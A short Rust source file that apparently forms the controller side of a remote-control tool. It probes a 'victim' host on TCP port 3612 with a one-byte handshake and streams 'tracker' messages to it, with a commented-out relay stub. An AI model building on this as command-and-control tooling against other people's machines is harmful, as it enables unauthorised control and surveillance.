use tokio::sync::broadcast::Receiver;
use tokio::{net::TcpStream, io::{BufReader, AsyncWriteExt, AsyncReadExt}};

use crate::Victim;

pub async fn is_victim_listening(victim: &Victim) -> bool {
    let mut stream = match TcpStream::connect(victim.ip.ip().to_string() + ":3612").await {
        Ok(stream) => stream,
        Err(_) => {
            error!("Failed to connect to {}'s server", victim.ip);
            return false;
        }
    };

    if stream.write_all(&[1]).await.is_err() {
        return false;
    }
    let mut buf_reader = BufReader::new(&mut stream);
    let mut buffer: [u8; 1] = [0];
    if let Err(err) = buf_reader.read_exact(&mut buffer).await {
        error!("Failed to read from {}'s server: {}", victim.ip, err);
        return false;
    }
    if buffer != [9] {
        error!("{}'s server didn't send 9 back", victim.ip);
        return false;
    }
    true
}

pub async fn manage_tracker(_victim: &Victim, stream: &mut TcpStream, mut receiver: Receiver<String>) -> Result<(), Box<dyn std::error::Error>> {
    stream.write_all(b"tracker\0").await?;
    loop {
        let message = receiver.recv().await?;
        stream.write_all(message.as_bytes()).await?;
        /* let mut buf_reader = BufReader::new(&mut stream);
        let mut request: Vec<u8> = Vec::new();
        buf_reader
            .read_until(0, &mut request).await?;

        let request = std::str::from_utf8(&request)?; */
        // let content = request.split_once('\n');

        // mean it should propagate the request to all trackers
        /* if let Some((first, rest)) = content {
            if first == "PROP" { */
            /* }
        } */
    }
}
